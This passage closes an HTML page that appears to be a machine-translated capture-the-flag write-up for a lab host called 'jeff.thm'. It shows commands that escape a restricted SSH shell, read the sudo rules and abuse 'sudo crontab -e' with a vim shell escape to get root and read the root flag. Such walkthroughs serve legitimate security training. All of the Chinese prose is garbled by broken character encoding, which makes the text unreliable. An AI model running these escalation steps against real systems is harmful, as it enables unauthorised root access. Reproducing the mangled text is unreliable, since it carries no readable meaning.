mj mk aw ml bi"><span id="a62e" class="mm lf iq mi b gy mn mo l mp mq">ssh jeff@jeff.thm # It will give restricted shell</span></pre><h1 id="7ee7" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">æƒé™æå‡-&gt; root</h1><p id="4c08" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">å¾ˆå®¹æ˜“å°†æˆ‘ä»¬çš„ç‰¹æƒæå‡åˆ°rootã€‚ä½†æ˜¯ç”¨æˆ·â€œjeffâ€æ­£åœ¨è¿è¡Œä¸€ä¸ªå—é™åˆ¶çš„shellï¼Œå› æ­¤è¦ä»å…¶ä¸­é€€å‡ºã€‚å¥”è·‘</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="58ac" class="mm lf iq mi b gy mn mo l mp mq">ssh jeff@jeff.thm -t "bash --noprofile"</span></pre><p id="09b4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">å½“è¯•å›¾å°†æˆ‘ä»¬çš„ç‰¹æƒæå‡åˆ°rootæ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆæ£€æŸ¥çš„æ˜¯è¿è¡Œâ€œsudo -lâ€ã€‚æˆ‘é”™äº†å—ï¼ŸğŸ˜œã€‚è¿è¡Œè¯¥å‘½ä»¤ä¼šæ˜¾ç¤º</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="1bab" class="mm lf iq mi b gy mn mo l mp mq">Matching Defaults entries for jeff on tryharder:<br/>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/>User jeff may run the following commands on tryharder:</span><span id="1f7c" class="mm lf iq mi b gy np mo l mp mq">(ALL) /usr/bin/crontab</span></pre><p id="a6cf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç°åœ¨è¿™å¾ˆå®¹æ˜“ã€‚å¿«è·‘å§</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="edfb" class="mm lf iq mi b gy mn mo l mp mq">sudo /usr/bin/crontab -e</span></pre><p id="d24d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">è¿™å°†æ‰“å¼€vimå¹¶é”®å…¥":ï¼/bin/bashâ€å¹¶æŒ‰å›è½¦é”®ã€‚è€¶ï¼æœ€ç»ˆæ‰æ ¹ğŸ˜ˆ</p><p id="03d5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç°åœ¨ï¼Œä»â€œ/root/root.txtâ€ä¸­è¯»å–æ ¹æ ‡å¿—</p></div><div class="ab cl nq nr hu ns" role="separator"><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv"/></div><div class="ij ik il im in"><h1 id="2f93" class="le lf iq bd lg lh nx lj lk ll ny ln lo lp nz lr ls lt oa lv lw lx ob lz ma mb bi translated">ç»“è®º:</h1><p id="dadf" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">å¥½å§ï¼Œå°±è¿™æ ·ã€‚æˆ‘å¸Œæœ›è¿™æ²¡æœ‰è®©ä½ åŒçƒ¦ã€‚è¿™æ˜¯æˆ‘æ¼”è¿‡çš„æœ€è‰°éš¾çš„CTFï¼Œæˆ‘éå¸¸å–œæ¬¢ã€‚èŠ±æ—¶é—´æ˜¯å€¼å¾—çš„ã€‚è¯·ç»§ç»­å…³æ³¨ï¼Œé˜…è¯»æ›´å¤šå…³äºCTFå’Œå¥–é‡‘çš„æ–‡ç« ã€‚æœ€åï¼Œæˆ‘çŸ¥é“æˆ‘çŠ¯äº†å¾ˆå¤šè¯­æ³•é”™è¯¯ï¼ŒåŸè°…æˆ‘ã€‚</p><p id="d370" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">~ R3 alix 01(Piyush achr ya)</p></div></div>    
</body>
</html>